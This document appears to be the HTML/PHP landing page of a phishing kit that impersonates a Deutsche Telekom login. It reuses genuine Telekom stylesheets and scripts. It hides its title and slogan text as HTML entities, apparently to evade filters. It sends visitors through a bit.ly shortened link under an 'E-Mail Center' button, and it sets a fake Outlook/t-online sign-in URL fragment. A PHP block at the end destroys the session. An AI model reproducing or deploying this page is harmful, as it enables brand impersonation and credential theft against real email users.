
<!DOCTYPE html>
<!--[if (lte IE 8) ]>
<html lang="de-DE" class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|!(IE)]><!-->
<html class="no-js" lang="de"><!--<![endif]-->








<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>&#84;&#101;l&#101;k&#111;&#109; &#76;&#111;&#103;&#105;&#110;</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />

    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/css/login-24.03.0.css">
    
    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>
    
    <!--[if lt IE 9]>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/html5shiv.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/jquery-matchheight-0.7.2.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/components.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/js/login.js"></script>
    
    <style>
      .img1{
	   width:400px;
	   overflow:hidden;
	   margin:0 auto;	  
	}
	.img2{
	   width:400px;
	   overflow:hidden;
	   margin:1em auto;
	   padding:2em 1em;	  
	}
	.heading1{
	  width:100%;
	  overflow:hidden;
	  font-family:Verdana, Geneva, sans-serif;
	  font-size:15px;
	  font-weight:600;
	  text-align:center;
	  padding:2em 0;
	  cursor:pointer;	
	}
	.heading1:hover{
	  background-color:#f9f6f3;	
	}
	.h-body{
	  width:100%;
	  overflow:hidden;
	  font-family:Verdana, Geneva, sans-serif;
	  font-size:15px;
	  font-weight:600;
	}
	.c-space{
	  width:100%;
	  height:70px;	
	}
    </style>
    
</head>

<body>

<header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">&#116;&#84;</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">&#101;&#114;&#108;&#101;&#98;&#101;&#110;, &#119;&#97;&#115; &#118;&#101;&#114;&#98;&#105;&#110;&#100;&#101;&#116;.</span>
                </div>
            </div>
        </div>
        
        
        
    </header>
     <div class="c-space"></div>
    <div class="img1">
        <div class="heading1"></div>
    </div>
    <div class="img2">
        <div class="h-body">
		  <p style="font-family:Arial, Helvetica, sans-serif;font-size:14px;color:#117aca; margin:1em 0"></p>
          <p style="font-family:Arial, Helvetica, sans-serif;font-size:14px;color:#117aca; margin:1em 0">Vielen Dank für Ihren Besuch im Telekom<sup><font size="2">&reg;</font></sup></p>
    </div>
	<center><a style="border-radius: 3px; font-size: 15px; color: white; border: 1px #b2b2b2 solid; box-shadow: inset 0 1px 0 #b2b2b2;, inset 1px 0 0 #48a1e2; text-decoration: none; padding: 8px 7px 8px 7px; width: 210px; max-width: 210px; font-family: proxima_nova, 'Open Sans', 'lucida grande', 'Segoe UI', arial, verdana, 'lucida sans unicode', tahoma, sans-serif; margin: 6px auto; display: block; background-color: #b2b2b2; text-align: center;" href="https://bit.ly/3gQk1b9">W&#101;&#105;&#116;&#101;&#114; &#122;&#117;&#109; &#69;-&#77;&#97;&#105;l &#67;&#101;&#110;&#116;&#101;r</a></center>
</center>
<script>
  
  location.hash = '&t-online=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&t-online=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&t-online=out&t-online=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain='
  
</script>
</body>
<?php
@session_start();
@session_destroy();
?>
</html>